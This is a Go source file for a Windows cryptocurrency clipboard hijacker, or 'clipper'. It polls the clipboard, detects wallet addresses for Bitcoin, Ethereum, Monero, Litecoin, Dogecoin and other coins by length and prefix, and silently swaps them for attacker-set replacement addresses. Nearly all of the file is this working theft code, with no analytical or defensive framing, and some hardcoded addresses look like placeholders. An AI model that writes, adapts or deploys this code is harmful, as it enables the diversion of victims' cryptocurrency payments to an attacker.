// ============================================================
// clipper.go - Cryptocurrency Clipboard Hijacker (Windows)
// ============================================================
package clipper

import (
	"log"
	"strings"
	"time"
	"unsafe"
	"syscall"
)

// Windows API constants
const (
	CF_TEXT            = 1
	CF_UNICODETEXT     = 13
	GMEM_MOVEABLE      = 0x0002
	GMEM_ZEROINIT      = 0x0040
	GHND               = GMEM_MOVEABLE | GMEM_ZEROINIT
)

// Windows API functions
var (
	user32                = syscall.NewLazyDLL("user32.dll")
	kernel32              = syscall.NewLazyDLL("kernel32.dll")
	
	openClipboard         = user32.NewProc("OpenClipboard")
	closeClipboard        = user32.NewProc("CloseClipboard")
	emptyClipboard        = user32.NewProc("EmptyClipboard")
	setClipboardData      = user32.NewProc("SetClipboardData")
	getClipboardData      = user32.NewProc("GetClipboardData")
	isClipboardFormatAvailable = user32.NewProc("IsClipboardFormatAvailable")
	
	globalAlloc           = kernel32.NewProc("GlobalAlloc")
	globalLock            = kernel32.NewProc("GlobalLock")
	globalUnlock          = kernel32.NewProc("GlobalUnlock")
	globalFree            = kernel32.NewProc("GlobalFree")
)

// Cryptocurrency address lengths for quick validation
var addressLengths = map[string][]int{
	"BTC": {26, 27, 28, 29, 30, 31, 32, 33, 34, 42, 62},
	"ETH": {42},
	"BCH": {42, 34},
	"XMR": {95},
	"LTC": {26, 33, 34},
	"DOGE": {34},
	"DASH": {34},
	"XLM": {56},
	"TRX": {34},
	"ADA": {39, 99},
	"XCH": {38, 99},
}

var (
	replacementAddresses = map[string]string{
		"BTC": "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
		"ETH": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
		"BCH": "qr23g7lz74j82k5s7m7x4qk7z6q5j5q5q5q5q5q5q",
		"XMR": "42f9Lx3J5zY3Xg6Q7H8w9e4r5t6y7u8i9o0p1a2s3d4f5g6h7j8k9l0",
		"LTC": "LM2oQhMqX8vLh1T3p5R7w9e4r5t6y7u8i9o0p",
		"DOGE": "D5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
	}
)

// Clipper struct
type Clipper struct {
	running       bool
	stopChan      chan bool
	checkInterval time.Duration
	lastClipboard string
}

// NewClipper creates a new clipper instance
func NewClipper() *Clipper {
	return &Clipper{
		running:       false,
		stopChan:      make(chan bool, 1),
		checkInterval: 500 * time.Millisecond,
	}
}

// Run starts the clipper
func Run(cryptoMap map[string]string) {
	// Update replacement addresses if provided
	if cryptoMap != nil {
		for coin, addr := range cryptoMap {
			if addr != "" {
				replacementAddresses[coin] = addr
			}
		}
	}
	
	log.Println("💰 Starting cryptocurrency clipper...")
	
	clipper := NewClipper()
	clipper.Start()
}

// Start begins the clipboard monitoring
func (c *Clipper) Start() {
	if c.running {
		return
	}
	
	c.running = true
	c.stopChan = make(chan bool, 1)
	
	log.Println("📋 Clipboard monitoring started")
	
	go c.monitorClipboard()
}

// Stop stops the clipboard monitoring
func (c *Clipper) Stop() {
	if !c.running {
		return
	}
	
	c.running = false
	c.stopChan <- true
	log.Println("📋 Clipboard monitoring stopped")
}

// monitorClipboard continuously checks the clipboard
func (c *Clipper) monitorClipboard() {
	ticker := time.NewTicker(c.checkInterval)
	defer ticker.Stop()
	
	for {
		select {
		case <-c.stopChan:
			return
		case <-ticker.C:
			c.checkAndReplace()
		}
	}
}

// checkAndReplace checks clipboard and replaces crypto addresses
func (c *Clipper) checkAndReplace() {
	clipText := c.getClipboardText()
	if clipText == "" {
		return
	}
	
	if clipText == c.lastClipboard {
		return
	}
	
	c.lastClipboard = clipText
	
	coin, address := c.detectCryptoAddress(clipText)
	if coin == "" {
		return
	}
	
	log.Printf("🔍 Detected %s address: %s", coin, address)
	
	if address == replacementAddresses[coin] {
		log.Printf("✅ Already our %s address, skipping", coin)
		return
	}
	
	replacement := replacementAddresses[coin]
	if replacement == "" {
		log.Printf("⚠️ No replacement address configured for %s", coin)
		return
	}
	
	log.Printf("🔄 Replacing %s address with: %s", coin, replacement)
	
	if c.replaceClipboardText(clipText, address, replacement) {
		log.Printf("✅ Clipboard replaced successfully")
	}
}

// detectCryptoAddress detects cryptocurrency addresses
func (c *Clipper) detectCryptoAddress(text string) (string, string) {
	text = strings.TrimSpace(text)
	length := len(text)
	
	for coin, lengths := range addressLengths {
		validLength := false
		for _, l := range lengths {
			if length == l {
				validLength = true
				break
			}
		}
		if !validLength {
			continue
		}
		
		if c.validateAddress(text, coin) {
			return coin, text
		}
	}
	
	return "", ""
}

// validateAddress validates an address for a specific coin
func (c *Clipper) validateAddress(address, coin string) bool {
	switch coin {
	case "BTC":
		return strings.HasPrefix(address, "1") ||
			strings.HasPrefix(address, "3") ||
			strings.HasPrefix(address, "bc1")
	case "ETH":
		return strings.HasPrefix(address, "0x")
	case "BCH":
		return strings.HasPrefix(address, "q") ||
			strings.HasPrefix(address, "p") ||
			strings.HasPrefix(address, "1") ||
			strings.HasPrefix(address, "3")
	case "XMR":
		return strings.HasPrefix(address, "4")
	case "LTC":
		return strings.HasPrefix(address, "L") ||
			strings.HasPrefix(address, "M") ||
			strings.HasPrefix(address, "3")
	case "DOGE":
		return strings.HasPrefix(address, "D")
	case "DASH":
		return strings.HasPrefix(address, "X")
	case "XLM":
		return strings.HasPrefix(address, "G")
	case "TRX":
		return strings.HasPrefix(address, "T")
	case "ADA":
		return strings.HasPrefix(address, "addr1")
	case "XCH":
		return strings.HasPrefix(address, "xch1")
	default:
		return false
	}
}

// getClipboardText retrieves text from clipboard
func (c *Clipper) getClipboardText() string {
	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer closeClipboard.Call()
	
	ret, _, _ = isClipboardFormatAvailable.Call(CF_UNICODETEXT)
	if ret == 0 {
		return ""
	}
	
	handle, _, _ := getClipboardData.Call(CF_UNICODETEXT)
	if handle == 0 {
		return ""
	}
	
	ptr, _, _ := globalLock.Call(handle)
	if ptr == 0 {
		return ""
	}
	defer globalUnlock.Call(handle)
	
	var text []uint16
	for i := 0; ; i++ {
		p := (*uint16)(unsafe.Pointer(ptr + uintptr(i*2)))
		if *p == 0 {
			break
		}
		text = append(text, *p)
	}
	
	return syscall.UTF16ToString(text)
}

// setClipboardText sets text to clipboard
func (c *Clipper) setClipboardText(text string) bool {
	utf16 := syscall.StringToUTF16(text)
	size := (len(utf16) - 1) * 2
	
	handle, _, _ := globalAlloc.Call(GHND, uintptr(size+2))
	if handle == 0 {
		return false
	}
	
	ptr, _, _ := globalLock.Call(handle)
	if ptr == 0 {
		globalFree.Call(handle)
		return false
	}
	
	mem := unsafe.Slice((*uint16)(unsafe.Pointer(ptr)), len(utf16))
	copy(mem, utf16)
	globalUnlock.Call(handle)
	
	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		globalFree.Call(handle)
		return false
	}
	defer closeClipboard.Call()
	
	emptyClipboard.Call()
	
	ret, _, _ = setClipboardData.Call(CF_UNICODETEXT, handle)
	return ret != 0
}

// replaceClipboardText replaces an address in the clipboard
func (c *Clipper) replaceClipboardText(fullText, oldAddress, newAddress string) bool {
	newText := strings.ReplaceAll(fullText, oldAddress, newAddress)
	
	if newText == fullText {
		return false
	}
	
	return c.setClipboardText(newText)
}

// GetReplacementAddress returns the replacement address for a coin
func GetReplacementAddress(coin string) string {
	return replacementAddresses[coin]
}

// SetReplacementAddress sets the replacement address for a coin
func SetReplacementAddress(coin, address string) {
	replacementAddresses[coin] = address
}